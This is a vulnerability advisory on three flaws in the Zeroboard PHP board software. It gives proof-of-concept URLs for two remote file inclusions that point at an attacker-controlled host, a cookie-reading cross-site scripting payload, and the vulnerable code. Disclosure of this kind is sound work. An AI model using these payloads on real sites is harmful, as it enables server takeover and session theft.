Vulnerability 1 : PHP source injection vulnerability
- - ------------------------------------
- - - Proof of concept
http://[victim]/outlogin.php?_zb_path=ftp://[attacker]/pub/

- - - Environment
PHP 5.0.x
php.ini : register_globals = On

- - - Description
As of PHP 5.0.0, file_exists() can be used with URL wrappers explained at
http://www.php.net/manual/en/function.file-exists.php. Thus _zb_path
parameter in outlogin.php can be easily exploited.

- - - Part of vulnerable source, outlogin.php.
- - ----
// 제로보드 디렉토리 인지 체크
if(!file_exists($_zb_path."lib.php")) {
  echo "제로보드 디렉토리가 아닙니다";
  return;
}

// _head.php 읽음
@include $_zb_path."_head.php";

}
- - ----

Vulnerability 2 : PHP source injection vulnerability
- - ------------------------------------
- - - Proof of concept
http://[victim]/include/write.php?dir=http://[attacker]/


- - - Environment
php.ini: register_globals = On

- - - Reason
Uninitialized $dir variable in write.php


- - - Part of vulnerable source, include/write.php
- - ----
include $dir."/write.php";
- - ----

Vulnerability 3 : Cross-site scripting vulnerability
- - --------------------------------------
- - - Proof of concept
http://[victim]/check_user_id.php?user_id=<script>alert(document.cookie)</sc
ript>


- - - Reason
check_user_id.php doesn't validate the input value of user_id.

- - - Part of vulnerable source, check_user_id.php
- - ----
$user_id = trim($user_id);
... 생략 ...
if($check[0]) echo "$user_id 는 이미 등록된<br> 아이디입니다";
else echo"$user_id 는 사용하실수 있습니다";
... 생략 ...
- - ----
